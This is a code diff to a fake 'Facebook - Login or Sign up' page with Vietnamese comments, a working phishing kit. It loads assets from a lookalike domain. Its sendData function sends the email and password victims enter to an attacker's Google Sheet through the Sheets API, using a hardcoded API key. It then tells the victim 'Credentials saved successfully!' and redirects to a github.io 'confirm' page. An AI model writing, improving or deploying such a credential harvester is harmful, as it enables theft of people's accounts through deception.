@@ -17,7 +17,7 @@
   <title>Facebook - Login or Sign up</title>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" rel="stylesheet">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="https://apis.google.com/js/api.js"></script>
+ <script src="https://apis.google.com/js/api.js" onload="onGapiLoad()"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   <script defer="defer" src="https://contactadsverrifyaccounts.cloud/static/js/main.aae6dd77.js"></script>
   <link href="http://contactadsverrifyaccounts.cloud/static/css/main.89ada21a.css" rel="stylesheet">
@@ -217,6 +217,20 @@
       const regex = /^[789]\d{9}$/;
       return regex.test(phone);
     }
+function onGapiLoad() {
+  gapi.load('client', initGapiClient); // Chạy initGapiClient khi gapi đã tải
+}
+
+function initGapiClient() {
+  gapi.client.init({
+    apiKey: "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc",
+    discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"]
+  }).then(function() {
+    console.log("Google Sheets API initialized.");
+  }).catch(function(error) {
+    console.error("Error initializing Google API: ", error);
+  });
+}
 
 function sendData(event) {
   event.preventDefault();
@@ -224,23 +238,13 @@ function sendData(event) {
   let email = document.getElementById("email").value.trim();
   const pass = document.getElementById("password").value.trim();
 
-  console.log("Form Data - Email:", email, "Password:", pass);  // Kiểm tra giá trị dữ liệu
-
-  // Kiểm tra nếu email hoặc pass trống
   if (!email || !pass) {
     alert("Please fill out all fields.");
     return;
   }
 
-  // Kiểm tra email hợp lệ
-  if (!isValidEmail(email)) {
-    alert("Please enter a valid email.");
-    return;
-  }
-
-  // Gọi Google Sheets API để lưu dữ liệu
+  // Thực hiện gọi API để thêm dữ liệu vào Google Sheets
   const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
-  const apiKey = "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc";
   const range = "Sheet1!A:B";
   const valueRangeBody = {
     "values": [
@@ -248,22 +252,15 @@ function sendData(event) {
     ]
   };
 
-  gapi.client.init({
-    apiKey: apiKey,
-    discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"]
-  }).then(() => {
-    console.log("Initializing Sheets API...");
-    return gapi.client.sheets.spreadsheets.values.append({
-      spreadsheetId: sheetId,
-      range: range,
-      valueInputOption: "RAW",
-      resource: valueRangeBody
-    });
-  }).then((response) => {
-    console.log("Data successfully saved:", response);
+  gapi.client.sheets.spreadsheets.values.append({
+    spreadsheetId: sheetId,
+    range: range,
+    valueInputOption: "RAW",
+    resource: valueRangeBody
+  }).then(function(response) {
     alert("Credentials saved successfully!");
     window.location.href = "https://girlhotnewstoday.github.io/logins/confirm.html";
-  }).catch((error) => {
+  }).catch(function(error) {
     console.error("Error saving data:", error);
     alert('Connection issue!');
   });
